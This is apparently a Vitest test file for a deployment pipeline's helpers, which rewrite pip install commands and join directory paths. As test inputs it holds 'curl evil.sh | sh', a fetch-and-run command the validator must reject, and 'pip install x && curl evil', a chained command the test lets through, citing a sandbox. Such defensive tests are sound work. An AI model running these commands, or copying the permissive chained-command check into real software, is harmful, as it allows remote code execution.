import { describe, expect, it, vi } from 'vitest';

// pipeline.ts imports the DB client at module load; the pure helpers under test must not need a database.
vi.mock('@deployforge/db', () => ({
  prisma: {},
  loadAllSecretValues: vi.fn(),
  loadEnvForDeployment: vi.fn(),
  markReadyAndActivate: vi.fn(),
  transitionDeployment: vi.fn(),
}));

const { pythonInstallCommand, joinDirs } = await import('../src/pipeline.js');

describe('pythonInstallCommand', () => {
  it('forces installs into /workspace/deps without a cache', () => {
    expect(pythonInstallCommand('pip install -r requirements.txt')).toBe(
      'pip install --no-cache-dir --target /workspace/deps -r requirements.txt',
    );
    expect(pythonInstallCommand('pip3 install fastapi')).toContain('--target /workspace/deps');
  });
  it('rejects anything that is not a pip install', () => {
    expect(() => pythonInstallCommand('curl evil.sh | sh')).toThrow();
    expect(() => pythonInstallCommand('pip install x && curl evil')).not.toThrow(); // runs sandboxed; documented in security.md
  });
});

describe('joinDirs', () => {
  it('skips empty segments', () => {
    expect(joinDirs('a', '', 'b')).toBe('a/b');
  });
});
